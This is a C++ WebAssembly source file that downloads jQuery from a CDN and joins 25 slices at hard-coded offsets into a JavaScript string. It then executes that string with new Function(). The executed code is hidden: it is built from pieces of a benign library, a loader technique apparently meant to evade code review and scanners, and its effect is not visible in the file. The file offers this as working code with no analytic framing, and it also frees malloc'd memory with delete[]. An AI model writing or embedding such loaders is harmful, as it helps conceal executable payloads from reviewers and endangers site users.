#include <emscripten.h>
#include <string>
#include <iostream>
#include <sstream>

using namespace std;

EM_JS(void, run_code, (const char* str), {
     new Function(UTF8ToString(str))();
});

EM_JS(char *, get_jquery, (), {
    var request = new XMLHttpRequest();
    request.open('GET', 'https://code.jquery.com/jquery-3.4.1.min.js', false);  // `false` makes the request synchronous
    request.send(null);

    if (request.status === 200) {
        var text = request.responseText;
        var lengthBytes = lengthBytesUTF8(text) + 1;
        var stringOnWasmHeap = _malloc(lengthBytes);
        stringToUTF8(text, stringOnWasmHeap, lengthBytes);
        return stringOnWasmHeap;
    } else {
        return null;
    }
});


int main() {
    int len = 25;
    int *idxs_table = new int[2*len];
    
    idxs_table[0] = 5708;	idxs_table[25 + 0] = 9;
	idxs_table[1] = 19;	idxs_table[25 + 1] = 2;
	idxs_table[2] = 22;	idxs_table[25 + 2] = 2;
	idxs_table[3] = 45218;	idxs_table[25 + 3] = 3;
	idxs_table[4] = 496;	idxs_table[25 + 4] = 3;
	idxs_table[5] = 4410;	idxs_table[25 + 5] = 2;
	idxs_table[6] = 45298;	idxs_table[25 + 6] = 5;
	idxs_table[7] = 3;	idxs_table[25 + 7] = 1;
	idxs_table[8] = 5496;	idxs_table[25 + 8] = 1;
	idxs_table[9] = 13193;	idxs_table[25 + 9] = 2;
	idxs_table[10] = 46910;	idxs_table[25 + 10] = 2;
	idxs_table[11] = 10220;	idxs_table[25 + 11] = 3;
	idxs_table[12] = 1539;	idxs_table[25 + 12] = 3;
	idxs_table[13] = 30966;	idxs_table[25 + 13] = 3;
	idxs_table[14] = 13168;	idxs_table[25 + 14] = 2;
	idxs_table[15] = 52831;	idxs_table[25 + 15] = 2;
	idxs_table[16] = 6078;	idxs_table[25 + 16] = 3;
	idxs_table[17] = 519;	idxs_table[25 + 17] = 2;
	idxs_table[18] = 55320;	idxs_table[25 + 18] = 2;
	idxs_table[19] = 38;	idxs_table[25 + 19] = 2;
	idxs_table[20] = 114;	idxs_table[25 + 20] = 2;
	idxs_table[21] = 34;	idxs_table[25 + 21] = 1;
	idxs_table[22] = 4320;	idxs_table[25 + 22] = 1;
	idxs_table[23] = 1599;	idxs_table[25 + 23] = 3;
	idxs_table[24] = 1290;	idxs_table[25 + 24] = 2;
    
    char* tmp = get_jquery();
    if (!tmp) return 1;
    string data(tmp);

    ostringstream oss("");
    for (int temp = 0; temp < len; temp++)
        oss << data.substr(idxs_table[temp], idxs_table[len + temp]);
    run_code(oss.str().c_str());

    delete[] idxs_table;
    delete[] tmp; 
}
